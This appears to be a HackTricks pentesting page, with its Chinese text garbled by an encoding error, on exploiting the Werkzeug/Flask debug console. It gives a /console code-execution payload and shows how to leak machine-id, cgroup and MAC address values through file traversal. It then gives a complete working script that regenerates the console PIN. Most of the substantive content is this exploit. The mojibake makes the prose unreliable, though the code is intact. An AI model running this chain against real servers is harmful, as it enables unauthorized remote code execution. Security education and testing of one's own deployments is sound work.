# Werkzeug / Flask è°ƒè¯•

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF ç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢ [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š **å…³æ³¨** æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR å®‰å…¨ä¼šè®®æ˜¯ä¸€ä¸ªå›½é™…ç½‘ç»œå®‰å…¨äº‹ä»¶**](https://www.dragonjarcon.org/)ï¼Œå·²æœ‰åå¤šå¹´çš„å†å²ï¼Œå°†äº 2023 å¹´ 9 æœˆ 7 æ—¥è‡³ 8 æ—¥åœ¨å“¥ä¼¦æ¯”äºšæ³¢å“¥å¤§ä¸¾è¡Œã€‚è¿™æ˜¯ä¸€ä¸ªæŠ€æœ¯å†…å®¹ä¸°å¯Œçš„æ´»åŠ¨ï¼Œä¼šå±•ç¤ºæœ€æ–°çš„è¥¿ç­ç‰™è¯­ç ”ç©¶ï¼Œå¸å¼•äº†æ¥è‡ªä¸–ç•Œå„åœ°çš„é»‘å®¢å’Œç ”ç©¶äººå‘˜ã€‚
ç°åœ¨å°±åœ¨ä»¥ä¸‹é“¾æ¥æ³¨å†Œï¼Œä¸è¦é”™è¿‡è¿™ä¸ªç››å¤§çš„ä¼šè®®ï¼:

{% embed url="https://www.dragonjarcon.org" %}

## æ§åˆ¶å° RCE

å¦‚æœè°ƒè¯•åŠŸèƒ½å¤„äºæ¿€æ´»çŠ¶æ€ï¼Œæ‚¨å¯ä»¥å°è¯•è®¿é—® `/console` å¹¶è·å¾— RCEã€‚
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

äº’è”ç½‘ä¸Šä¹Ÿæœ‰å‡ ä¸ªåƒ[è¿™ä¸ª](https://github.com/its-arun/Werkzeug-Debug-RCE)æˆ–è€…åœ¨metasploitä¸­çš„æ¼æ´ã€‚

## Pinä¿æŠ¤ - è·¯å¾„éå†

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œ**`/console`** ç«¯ç‚¹ä¼šè¢«ä¸€ä¸ªpinä¿æŠ¤ã€‚å¦‚æœä½ æœ‰ä¸€ä¸ª**æ–‡ä»¶éå†æ¼æ´**ï¼Œä½ å¯ä»¥æ³„éœ²æ‰€æœ‰ç”Ÿæˆè¯¥pinæ‰€éœ€çš„ä¿¡æ¯ã€‚

### Werkzeugæ§åˆ¶å°PINæ¼æ´

**ä»ç¬¬ä¸€ä¸ªé“¾æ¥å¤åˆ¶ã€‚**\
é€šè¿‡åœ¨åº”ç”¨ç¨‹åºä¸­å¼ºåˆ¶è°ƒè¯•é”™è¯¯é¡µé¢ï¼ŒæŸ¥çœ‹Werkzeugâ€œæ§åˆ¶å°é”å®šâ€æ¶ˆæ¯ã€‚
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
åœ¨è·¯å¾„ `vulnerable-site.com/console` å¤„å®šä½åˆ°å­˜åœ¨æ¼æ´çš„ Werkzeug è°ƒè¯•æ§åˆ¶å°ï¼Œä½†å®ƒè¢«ä¸€ä¸ªç§˜å¯†PINç é”å®šã€‚

æ‚¨å¯ä»¥åå‘å·¥ç¨‹ç”Ÿæˆæ§åˆ¶å°PINçš„ç®—æ³•ã€‚æ£€æŸ¥æœåŠ¡å™¨ä¸Šçš„ Werkzeug è°ƒè¯• `__init__.py` æ–‡ä»¶ï¼Œä¾‹å¦‚ `python3.5/site-packages/werkzeug/debug/__init__.py`ã€‚æ‚¨å¯ä»¥æŸ¥çœ‹[**Werkzeug æºä»£ç ä»“åº“**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) **ä»¥æ£€æŸ¥ PIN æ˜¯å¦‚ä½•ç”Ÿæˆçš„**ï¼Œä½†é€šè¿‡**æ–‡ä»¶éå†æ¼æ´**æ³„éœ²æºä»£ç æ›´ä½³ï¼Œå› ä¸ºç‰ˆæœ¬å¯èƒ½æœ‰æ‰€ä¸åŒã€‚

åˆ©ç”¨æ§åˆ¶å°PINæ‰€éœ€çš„å˜é‡ï¼š
```python
probably_public_bits = [
username,
modname,
getattr(app, '__name__', getattr(app.__class__, '__name__')),
getattr(mod, '__file__', None),
]

private_bits = [
str(uuid.getnode()),
get_machine_id(),
]
```
#### **`probably_public_bits`**

* **`username`** æ˜¯å¯åŠ¨è¿™ä¸ª Flask çš„ç”¨æˆ·
* **`modname`** æ˜¯ flask.app
* `getattr(app, '__name__', getattr(app.__class__, '__name__'))` æ˜¯ **Flask**
* `getattr(mod, '__file__', None)` æ˜¯ flask ç›®å½•ä¸­ **`app.py` çš„ç»å¯¹è·¯å¾„**ï¼ˆä¾‹å¦‚ï¼š`/usr/local/lib/python3.5/dist-packages/flask/app.py`ï¼‰ã€‚å¦‚æœ `app.py` ä¸è¡Œï¼Œ**å°è¯• `app.pyc`**

#### `private_bits`

*   `uuid.getnode()` æ˜¯ **å½“å‰è®¡ç®—æœºçš„ MAC åœ°å€**ï¼Œ`str(uuid.getnode())` æ˜¯ mac åœ°å€çš„åè¿›åˆ¶è¡¨è¾¾ã€‚

* è¦ **æ‰¾åˆ°æœåŠ¡å™¨ MAC åœ°å€**ï¼Œéœ€è¦çŸ¥é“å“ªä¸ª **ç½‘ç»œæ¥å£è¢«ç”¨æ¥æœåŠ¡åº”ç”¨**ï¼ˆä¾‹å¦‚ï¼š`ens3`ï¼‰ã€‚å¦‚æœæœªçŸ¥ï¼Œ**æ³„éœ² `/proc/net/arp`** ä»¥è·å–è®¾å¤‡ IDï¼Œç„¶ååœ¨ **`/sys/class/net/<device id>/address`** **æ³„éœ²** MAC åœ°å€ã€‚

é€šè¿‡åœ¨ python ä¸­è¿è¡Œå°† **åå…­è¿›åˆ¶åœ°å€è½¬æ¢ä¸ºåè¿›åˆ¶** è¡¨ç¤ºï¼Œä¾‹å¦‚ï¼š

```python
# å®ƒæ˜¯ 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* `get_machine_id()` é€šè¿‡è¿æ¥ **`/etc/machine-id`** æˆ– **`/proc/sys/kernel/random/boot_id`** ä¸­çš„ **å€¼** ä¸ **`/proc/self/cgroup`** ç¬¬ä¸€è¡Œçš„æœ€åä¸€ä¸ªæ–œæ ï¼ˆ`/`ï¼‰åçš„å†…å®¹ã€‚

<details>

<summary>get_machine_id() ä»£ç </summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

å‡†å¤‡å¥½æ‰€æœ‰å˜é‡åï¼Œè¿è¡Œåˆ©ç”¨è„šæœ¬ä»¥ç”Ÿæˆ Werkzeug æ§åˆ¶å° PINï¼š
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',# username
'flask.app',# modname
'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
{% hint style="success" %}
å¦‚æœä½ ä½¿ç”¨çš„æ˜¯Werkzeugçš„**æ—§ç‰ˆæœ¬**ï¼Œå°è¯•å°†**å“ˆå¸Œç®—æ³•æ›´æ”¹ä¸ºmd5**è€Œä¸æ˜¯sha1ã€‚
{% endhint %}

## å‚è€ƒèµ„æ–™

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference æ˜¯ä¸€ä¸ªå›½é™…æ€§çš„ç½‘ç»œå®‰å…¨äº‹ä»¶**](https://www.dragonjarcon.org/)ï¼Œå·²ç»æœ‰åå¤šå¹´çš„å†å²ï¼Œå°†äº**2023å¹´9æœˆ7æ—¥å’Œ8æ—¥**åœ¨å“¥ä¼¦æ¯”äºšçš„æ³¢å“¥å¤§ä¸¾è¡Œã€‚è¿™æ˜¯ä¸€ä¸ªæŠ€æœ¯å†…å®¹ä¸°å¯Œçš„æ´»åŠ¨ï¼Œä¼šå±•ç¤ºæœ€æ–°çš„è¥¿ç­ç‰™è¯­ç ”ç©¶æˆæœï¼Œå¸å¼•äº†æ¥è‡ªä¸–ç•Œå„åœ°çš„é»‘å®¢å’Œç ”ç©¶äººå‘˜ã€‚
ç°åœ¨å°±åœ¨ä»¥ä¸‹é“¾æ¥æ³¨å†Œï¼Œä¸è¦é”™è¿‡è¿™ä¸ªé‡è¦çš„ä¼šè®®ï¼:

{% embed url="https://www.dragonjarcon.org" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨HackTricksä¸Šçœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**æˆ–è€…**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚

</details>
